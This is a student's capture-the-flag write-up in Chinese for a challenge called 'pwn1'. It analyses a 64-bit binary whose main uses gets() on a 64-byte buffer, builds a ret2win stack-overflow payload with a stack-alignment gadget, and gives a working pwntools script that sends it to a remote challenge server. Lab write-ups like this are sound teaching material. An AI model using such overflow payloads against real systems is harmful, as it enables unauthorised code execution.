## PWN1
##### 罗承煜 523031910624

#### 程序分析
首先用file命令查看代码相关信息
```
┌──(myvenv)─(kali㉿kali)-[~/Desktop/little_test/pwn1]
└─$ file ./pwn1
./pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=88a5ac248586dee32bdc2b6678fb998673451c55, for GNU/Linux 3.2.0, not stripped
```
64 位程序，采用小端序，动态链接

#### 代码
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-40h] BYREF

  gets(v4, argv, envp);
  return 0;
}
```
在 main 中有一个64字节的数组，推测可能存在溢出。

```
int win()
{
  return system("cat flag.txt");
}
```
发现有一个叫```win```的函数，点开看发现内含system系统调用，可以直接输出flag.txt中的信息，所以只要想办法执行```win```函数即可

#### payload构造
先查看win函数的地址：
<center>
    <img src="win.png" alt="win">
</center>
缓冲区大小为 64 字节，则还需覆盖 8 字节的保存 RBP，共需 64 + 8 = 72 字节填充数据
但由于程序是64位的，而且需要调用系统函数，所以要注意rbp的起始位置是16的整数倍，而72=8*9，需要对齐地址，所以在填充```win```函数地址之前要放一个```ret```的地址，以实现对齐rbp的位置
所以payload = 72 * b'a' + p64(0x401179) + p64(0x40117A)

#### 脚本编写
```
from pwn import * 
context.arch = 'amd64'
payload = 72 * b'a' + p64(0x401179) + p64(0x40117A) 

#io = process('./pwn1') 用于本地调试
io = remote('202.120.7.16',24785) 
io.sendline(payload) 
io.interactive()
```
运行即可得到flag